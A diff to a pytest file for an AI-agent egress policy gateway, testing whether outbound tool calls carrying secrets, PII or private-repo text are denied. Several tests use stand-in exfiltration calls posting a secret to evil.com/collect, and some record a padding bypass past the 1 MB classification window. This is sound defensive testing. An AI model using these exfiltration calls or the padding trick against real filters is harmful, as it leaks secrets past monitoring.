@@ -1,4 +1,4 @@
-"""Tier-3 egress PDP — policy unit tests + endpoint test.
+"""Egress PDP — policy unit tests + endpoint test.
 
 Covers every cell of the decision matrix (destination ∈ {allowlisted, untrusted} ×
 sensitivity ∈ {none, pii, secret, private_repo}), the in-scope/out-of-scope branch,
@@ -21,7 +21,7 @@ PRIVATE_REPO_BODY = "see internal/secret-project/readme"
 BENIGN_BODY = "hello world, just chatting"
 
 
-# ---- in-scope test ----------------------------------------------------------
+# ---- in-scope test ---------------------------------------------------------------
 
 def test_out_of_scope_tool_is_allowed():
     v = egress_policy.evaluate(
@@ -64,7 +64,7 @@ def test_in_scope_via_bare_host_port():
     assert v.destination == "internal.example"
 
 
-# ---- loopback-always-allowed --------------------------------------------------
+# ---- loopback-always-allowed -----------------------------------------------------
 
 @pytest.mark.parametrize("host", ["127.0.0.1", "localhost"])
 def test_loopback_always_allowed_even_with_secret(host):
@@ -78,7 +78,7 @@ def test_loopback_always_allowed_even_with_secret(host):
     assert v.destination == host
 
 
-# ---- decision matrix ----------------------------------------------------------
+# ---- decision matrix ---------------------------------------------------------------
 # allowlisted destination, any sensitivity -> allow
 
 @pytest.mark.parametrize("body,expected_sensitivity", [
@@ -138,7 +138,7 @@ def test_untrusted_destination_sensitive_payload_denies(body, expected_sensitivi
     assert expected_sensitivity in v.reason or any(h in v.reason for h in v.hit_types)
 
 
-# ---- allow_with_conditions reserved but unimplemented --------------------------
+# ---- allow_with_conditions reserved but unimplemented ------------------------------
 
 def test_decision_is_only_ever_allow_or_deny():
     cases = [
@@ -154,9 +154,8 @@ def test_decision_is_only_ever_allow_or_deny():
 
 # ---- endpoint-level test ------------------------------------------------------------
 #
-# `pdp_token="t"` is the PDP's dedicated bearer (mandatory posture). `local_api_key` is
-# set to a DIFFERENT value so these tests also pin the role separation: the local
-# upstream's credential must not authenticate against the PDP.
+# `pdp_token` and `local_api_key` get different values so the tests below can show that
+# the endpoint accepts only the PDP token.
 
 @pytest.fixture
 def egress_gateway(gateway):
@@ -205,40 +204,41 @@ async def test_endpoint_allows_benign_request_to_allowlisted_destination(egress_
     assert body["audit_id"]
 
 
-async def test_endpoint_rejects_missing_bearer(egress_gateway):
-    """An unauthenticated PDP call is a 401 — auth is mandatory, not conditional."""
-    r = await egress_gateway.client.post(
-        "/a/egress/decision",
-        json={"tool_name": "http_request", "tool_kind": "network",
-              "arguments": {"url": "https://evil.com/collect", "body": SECRET_BODY}},
-    )
-    assert r.status_code == 401
+async def test_endpoint_auth_is_mandatory_and_role_separated(egress_gateway):
+    """The PDP accepts exactly AGENTGATE_PDP_TOKEN — not the local upstream's key.
 
-
-async def test_endpoint_rejects_the_local_api_key(egress_gateway):
-    """The local upstream's credential must not authenticate against the PDP.
-
-    Reusing `local_api_key` as the PDP bearer made one value span two trust boundaries —
-    the credential sent outbound to the local model server also authenticated inbound
-    policy queries. The dedicated AGENTGATE_PDP_TOKEN separates the roles; the upstream
-    key now 401s here.
+    Reusing local_api_key would make one value span two trust boundaries: the PDP
+    bearer and the credential sent outbound to a local model server. The dedicated token
+    separates the roles; the upstream key must 401 here. No bearer at all must also 401 —
+    auth is mandatory, not conditional, because loopback excludes remote sockets, not
+    remote code (a browser page can reach 127.0.0.1 and probe this endpoint as a policy
+    oracle; the token is what a page cannot have).
     """
-    r = await egress_gateway.client.post(
-        "/a/egress/decision",
-        json={"tool_name": "http_request", "tool_kind": "network",
-              "arguments": {"url": "https://evil.com/collect", "body": SECRET_BODY}},
-        headers={"authorization": "Bearer upstream-key"},
-    )
-    assert r.status_code == 401
+    payload = {
+        "tool_name": "http_request",
+        "tool_kind": "network",
+        "arguments": {"url": "https://api.internal.example/ingest", "body": BENIGN_BODY},
+    }
+    client = egress_gateway.client
+    no_bearer = await client.post("/a/egress/decision", json=payload)
+    assert no_bearer.status_code == 401
+    upstream_key = await client.post(
+        "/a/egress/decision", json=payload,
+        headers={"authorization": "Bearer upstream-key"})
+    assert upstream_key.status_code == 401
+    dedicated = await client.post(
+        "/a/egress/decision", json=payload,
+        headers={"authorization": "Bearer t"})
+    assert dedicated.status_code == 200
 
 
 # ---- classification window --------------------------------------------------
 
 def test_padding_cannot_hide_a_secret_from_the_sensitivity_axis():
-    """A secret pushed past the classification window used to read as sensitivity=none.
+    """Padding in front of a secret must not push it out of the classification window.
 
-    The payload axis is half the decision matrix, so padding in front of a secret was
-    enough to turn a deny into an allow on a non-allowlisted destination — no
+    The payload axis is half the decision matrix, so padding in front of a secret would
+    be enough to turn a deny into an allow on a non-allowlisted destination — no
     obfuscation of the secret itself required.
     """
     def ev(body):
@@ -250,17 +250,17 @@ def test_padding_cannot_hide_a_secret_from_the_sensitivity_axis():
         )
 
     assert ev(SECRET_BODY).decision == "deny"
-    assert ev("A" * 20_000 + "\n" + SECRET_BODY).decision == "deny"    # was "allow"
+    assert ev("A" * 20_000 + "\n" + SECRET_BODY).decision == "deny"
     assert ev("A" * 500_000 + "\n" + SECRET_BODY).decision == "deny"
     assert ev("A" * 20_000 + "\n" + SECRET_BODY).sensitivity is Sensitivity.SECRET
 
 
 def test_classification_window_is_still_bounded():
-    """The window is wider, not infinite — and that residual is deliberate.
+    """The window is large but finite: a secret placed past it is not seen, and the call
+    is allowed.
 
-    Pinned so that raising or lowering _MAX_PAYLOAD_CHARS is a conscious edit rather
-    than something a future change slides past. The timing bound is the other half:
-    the window is only affordable while the detection patterns stay linear.
+    The timing check confirms that a full window classifies quickly, which holds only
+    while the detection patterns run in linear time.
     """
     import time
 
@@ -279,10 +279,10 @@ def test_classification_window_is_still_bounded():
 async def test_decision_does_not_block_the_event_loop(egress_gateway):
     """A big payload must not stop the gateway answering everyone else.
 
-    The classification window is 1 MB and the detection patterns are linear, so a
-    worst-case payload is seconds of pure CPU. Run inline in the async handler that was
-    seconds in which this process — shared across every API key — answered nothing at
-    all, for a decision that runs once per egress tool call.
+    The classification window is 1 MB, and a full window takes up to about half a second
+    of pure CPU (the note on `_MAX_PAYLOAD_CHARS`). Run inline in the async handler, that
+    would be time in which this process — shared across every API key — answers nothing
+    at all, for a decision that runs once per egress tool call.
     """
     import asyncio
 
@@ -310,3 +310,66 @@ async def test_decision_does_not_block_the_event_loop(egress_gateway):
 
     assert r.status_code == 200
     assert ticks > 0, "the event loop never ran while one egress decision was classifying"
+
+
+# ---- classification window: the truncation caveat -----------------
+
+def test_payload_past_the_window_carries_a_truncation_caveat_on_allow_and_deny():
+    """`truncated:egress_payload:1000000` marks every verdict whose payload axis read
+    the first 1 MB and stopped.
+
+    The allow past the window that `test_classification_window_is_still_bounded` pins
+    as a deliberate limit is visible per row; a deny on a secret inside the
+    window says the rest went unread; the allowlisted branch carries it too. Exactly
+    1 MB is fully read and carries nothing, and a payload never classified (out of
+    scope) carries nothing.
+    """
+    bound = egress_policy._MAX_PAYLOAD_CHARS
+    caveat = [f"truncated:egress_payload:{bound}"]
+    url = "https://evil.com/collect"
+
+    def ev(body):
+        return egress_policy.evaluate(
+            tool_name="http_request", arguments={"url": url, "body": body},
+            tool_kind="network", allowlist=ALLOWLIST,
+        )
+
+    past = ev("A" * bound + "\n" + SECRET_BODY)
+    assert past.decision == "allow" and past.caveats == caveat
+    denied = ev(SECRET_BODY + "\n" + "A" * bound)
+    assert denied.decision == "deny" and denied.caveats == caveat
+    safe = egress_policy.evaluate(
+        tool_name="http_request",
+        arguments={"url": "https://api.internal.example/x", "body": "A" * (bound + 1)},
+        tool_kind="network", allowlist=ALLOWLIST,
+    )
+    assert safe.decision == "allow" and safe.policy == "network-egress"
+    assert safe.caveats == caveat
+
+    exact = ev("A" * (bound - len(url) - 1))  # url + separator + body == the window
+    assert exact.decision == "allow" and exact.caveats == []
+    assert ev(BENIGN_BODY).caveats == []
+    out = egress_policy.evaluate(
+        tool_name="read_file", arguments={"path": "A" * (bound + 1)},
+        tool_kind="filesystem", allowlist=ALLOWLIST,
+    )
+    assert out.policy == "out-of-scope" and out.caveats == []
+
+
+async def test_endpoint_row_carries_the_payload_truncation_caveat(egress_gateway):
+    from agentgate.observability import metrics
+    from tests.support import wait_for_audit_row
+
+    bound = egress_policy._MAX_PAYLOAD_CHARS
+    before = metrics.scan_truncated_total.labels("egress_payload")._value.get()
+    r = await egress_gateway.client.post(
+        "/a/egress/decision",
+        json={"tool_name": "http_request", "tool_kind": "network",
+              "arguments": {"url": "https://evil.com/collect", "body": "A" * (bound + 1)}},
+        headers={"authorization": "Bearer t"},
+    )
+    assert r.status_code == 200 and r.json()["decision"] == "allow"
+    row = await wait_for_audit_row(egress_gateway.store)
+    assert row is not None and row.route_provider == "egress" and row.status == 200
+    assert row.caveats == [f"truncated:egress_payload:{bound}"]
+    assert metrics.scan_truncated_total.labels("egress_payload")._value.get() == before + 1
